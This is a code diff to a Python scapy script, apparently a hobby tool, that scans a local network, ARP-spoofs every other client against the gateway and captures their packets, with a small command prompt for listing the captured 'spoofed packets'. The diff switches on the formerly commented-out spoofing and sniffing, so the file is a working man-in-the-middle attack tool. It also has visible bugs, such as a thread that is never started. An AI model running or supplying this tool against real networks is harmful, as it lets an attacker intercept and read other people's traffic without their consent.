@@ -257,15 +257,12 @@ def to_CIDR_notation(bytes_network, bytes_netmask):
 def scan(net, interface, timeout=5):
     ret = []
     try:
-        ans, unans = scapy.layers.l2.arping(net, iface=interface, timeout=timeout, verbose=True)
+        ans, unans = scapy.layers.l2.arping(net, iface=interface, timeout=timeout)
         for s, r in ans.res:
             line = [r.src, r.psrc]
             try:
-                #hostname = socket.gethostbyaddr(r.psrc)
-                #line += " " + hostname[0]
                 ret.append(line)
             except socket.herror:
-                # failed to resolve
                 pass
     except socket.error as e:
         raise
@@ -277,12 +274,14 @@ class Client():
         self.mac = mac
         self.type = (self.ip == host_ip or self.ip == gateway_ip)
 
+
 class IPtable():
     def __init__(self, host_mac, host_ip, gateway_ip, gateway_mac):
         self.mac = host_mac
         self.ip = host_ip
         self.gateway_ip = gateway_ip
         self.gateway_mac = gateway_mac
+        self.packets = []
         self.clients = [Client(self.ip, self.mac), Client(self.gateway_ip, self.gateway_mac)]
 
     def find(self, client):
@@ -294,7 +293,6 @@ class IPtable():
     def emplase(self, client):
         if (self.find(client) == -1):
             self.clients.append(client)
-            spoof(client.ip, client.mac, self.gateway_ip, self.gateway_mac)
 
     def drop(self, client):
         if (self.find(client) != -1):
@@ -320,28 +318,44 @@ class IPtable():
                 for line in i:
                     ips.append(line)
         for i in ips:
-            self.clients.append(Client(ips[1], ips[0]))
+            self.emplase(Client(ips[1], ips[0]))
 
     def attack(self):
         for client in self.clients:
             if (client.type == False):
                 spoof(client.ip, client.mac, self.gateway_ip, self.gateway_mac)
 
+    def restore(self):
+        for client in self.clients:
+            if (client.type == False):
+                restore(client.ip, client.mac, self.gateway_ip, self.mac)
 
-def main():
-    conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
-    gateway_mac = get_mac(gateway_ip)
-    Ips = IPtable(host_mac, host_ip, gateway_ip, gateway_mac)
+
+def main(Ips):
     Ips.scan()
-    #Ips.attack()
-    #while (True):
-    #    raw_data, address = conn.recvfrom(65535)
-    #    Seg = factory(raw_data)
-    #    Seg.print_values()
-    for client in Ips.clients:
-        print(client.ip)
+    Ips.attack()
+    while (True):
+        raw_data, address = conn.recvfrom(65535)
+        Seg = factory(raw_data)
+        Ips.packets.append(Seg)
 
 
 
 if __name__ == '__main__':
-    main()
+    conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
+    gateway_mac = get_mac(gateway_ip)
+    Ips = IPtable(host_mac, host_ip, gateway_ip, gateway_mac)
+    th = threading.Thread(target=main, args=(Ips, ), daemon=True)
+    command = ''
+    while (command != 'exit'):
+        command = input('input command:')
+        if command == 'help':
+            print("print 'ips' to get list of ips")
+            print("print 'packets' to get list of spoofed packets")
+            print("print 'exit' to exit")
+        if command == 'ips':
+            for i in Ips.clients:
+                print(i.ip)
+        if command == 'packets':
+            for i in Ips.packets:
+                i.print_values()
